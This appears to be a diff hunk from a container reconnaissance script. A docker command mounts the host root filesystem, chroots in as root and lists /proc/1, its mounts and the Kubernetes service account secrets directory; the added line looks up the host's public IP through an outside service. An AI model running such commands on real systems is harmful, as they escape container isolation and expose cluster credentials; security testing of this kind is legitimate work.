@@ -39,3 +39,4 @@ docker run -v /:/host enkaskal/docker-debian /bin/bash -c 'chroot /host su - roo
   echo RECON:/proc/1 ; ls -alR /proc/1 ; \
   echo RECON:cat /proc/1/mounts ; cat /proc/1/mounts ; \
   echo RECON:/run/secrets/kubernetes.io/serviceaccount ; find /run/secrets/kubernetes.io/serviceaccount -exec ls -al {} \;"'
+  echo RECON:WANIP ; curl https://wtfismyip.com/text
